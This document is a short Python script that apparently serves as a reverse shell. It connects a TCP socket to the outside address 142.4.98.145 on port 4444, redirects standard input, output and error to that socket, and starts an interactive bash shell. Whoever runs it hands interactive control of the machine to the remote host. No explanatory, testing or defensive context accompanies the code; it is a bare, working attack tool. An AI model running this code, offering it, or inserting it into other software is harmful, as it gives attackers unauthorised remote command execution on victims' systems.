import os
import socket
import subprocess

channel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
channel.connect(('142.4.98.145', 4444))
for descriptor in (0, 1, 2):
    os.dup2(channel.fileno(), descriptor)
subprocess.Popen(['/bin/bash', '-i'])
